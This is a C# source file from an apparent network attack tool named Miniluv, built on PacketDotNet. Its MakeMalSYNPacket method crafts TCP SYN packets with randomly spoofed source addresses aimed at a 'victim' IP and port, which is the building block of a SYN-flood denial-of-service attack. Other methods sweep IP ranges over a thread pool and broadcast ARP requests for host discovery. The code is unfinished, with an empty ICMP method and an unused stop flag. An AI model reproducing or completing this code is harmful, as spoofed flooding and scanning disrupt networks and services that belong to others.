using Assimilation;
using PacketDotNet;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace Miniluv
{
    public class SendPacket
    {
        public stDeviceInfo m_stDeviceInfo;
        public delegate void delSendPacket(IPAddress ip);

        private bool m_bSendIpRange { get; set; }

        public SendPacket(stDeviceInfo deviceInfo)
        {
            m_stDeviceInfo = deviceInfo;
        }

        private Packet MakeMalSYNPacket(string szVictimIP, int nPort)
        {
            PhysicalAddress myMAC = m_stDeviceInfo.device.MacAddress;

            EthernetPacket pktEth = new EthernetPacket(myMAC, m_stDeviceInfo.networkInterface.GetPhysicalAddress(), EthernetType.IPv4);
            IPv4Packet pktV4 = new IPv4Packet(IPTool.RandomIPv4Address(), IPAddress.Parse(szVictimIP));
            TcpPacket pktTCP = new TcpPacket((ushort)new Random().Next(1024, 65535), (ushort)nPort);

            pktV4.Id = 1000;

            pktTCP.Synchronize = true;
            pktTCP.SequenceNumber = 1;

            pktV4.PayloadPacket = pktTCP;
            pktEth.PayloadPacket = pktV4;

            return pktEth;
        }

        public void SendRequestWithIpRange(IPAddress ipStart, IPAddress ipEnd, delSendPacket funcSend, int nThreadCount)
        {
            uint uIpStart = IPTool.IPToUInt32(ipStart);
            uint uIpEnd = IPTool.IPToUInt32(ipEnd);

            if (uIpStart > uIpEnd)
            {
                MessageBox.Show("Invalid IP range.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            if (m_stDeviceInfo.device == null)
            {
                MessageBox.Show("m_stDeviceInfo.device is null", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            m_bSendIpRange = true;

            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThreadCount, nThreadCount);
            for (uint i = uIpStart; i <= uIpEnd; i++)
            {
                IPAddress ipAddr = IPTool.UInt32ToIP(i);
                ThreadPool.QueueUserWorkItem(x => funcSend(ipAddr));


            }
        }
        public void StopSendIpRange()
        {
            m_bSendIpRange = false;
        }

        /// <summary>
        /// Boardcast an ARP request packet.
        /// </summary>
        /// <param name="ipv4Target">Target IPv4 address</param>
        public void SendArpRequest(IPAddress ipv4Target)
        {
            var device = m_stDeviceInfo.device;
            if (device == null)
            {
                MessageBox.Show("Null device", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            PhysicalAddress srcMAC = device.MacAddress;
            IPAddress srcIPv4 = IPAddress.Parse(m_stDeviceInfo.IPv4Address);
            IPAddress dstIPv4 = ipv4Target;

            var pktEth = new EthernetPacket(srcMAC, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"), EthernetType.Arp);
            var pktArp = new ArpPacket(ArpOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), dstIPv4, srcMAC, srcIPv4);

            pktEth.PayloadPacket = pktArp;
            device.SendPacket(pktEth.Bytes);
        }
        /// <summary>
        /// Boardcast an ARP request packet.
        /// </summary>
        /// <param name="szIPv4Addr">Target IPv4 address</param>
        public void SendArpRequest(string szIPv4Addr) => SendArpRequest(IPAddress.Parse(szIPv4Addr));

        public void SendIcmpEcho()
        {

        }
    }
}
